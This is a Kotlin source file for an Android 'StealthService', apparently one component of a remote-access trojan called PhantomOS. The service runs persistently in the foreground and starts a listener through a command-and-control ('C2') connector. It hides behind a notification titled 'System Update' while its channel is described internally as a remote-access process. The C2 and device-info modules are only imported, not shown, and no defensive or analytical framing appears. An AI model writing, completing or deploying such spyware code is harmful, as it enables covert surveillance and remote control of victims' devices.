package com.phantom.os.services

import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Intent
import android.os.Build
import android.os.IBinder
import android.util.Log
import com.phantom.os.utils.DeviceInfoCollector
import com.phantom.os.network.C2Connector

class StealthService : Service() {

    companion object {
        const val TAG = "PhantomService"
        const val CHANNEL_ID = "PhantomCore"
    }

    private var c2Connector: C2Connector? = null

    override fun onCreate() {
        super.onCreate()
        Log.d(TAG, "🚀 Stealth Service Created")
        createNotificationChannel()
        startForeground(1, buildNotification("PhantomOS Active"))
        
        // Iniciar la conexión con el servidor C2
        c2Connector = C2Connector(this)
        c2Connector?.startListening()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        return START_STICKY
    }

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onDestroy() {
        super.onDestroy()
        Log.d(TAG, "💀 Service Destroyed")
        c2Connector?.stopListening()
    }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val name = "Phantom Core"
            val descriptionText = "System process for remote access"
            val importance = NotificationManager.IMPORTANCE_LOW
            val channel = NotificationChannel(CHANNEL_ID, name, importance).apply {
                description = descriptionText
            }
            val notificationManager = getSystemService(NOTIFICATION_SERVICE) as NotificationManager
            notificationManager.createNotificationChannel(channel)
        }
    }

    private fun buildNotification(contentText: String) = android.app.Notification.Builder(this, CHANNEL_ID)
        .setContentTitle("System Update")
        .setContentText(contentText)
        .setSmallIcon(android.R.drawable.ic_dialog_info)
        .build()
}
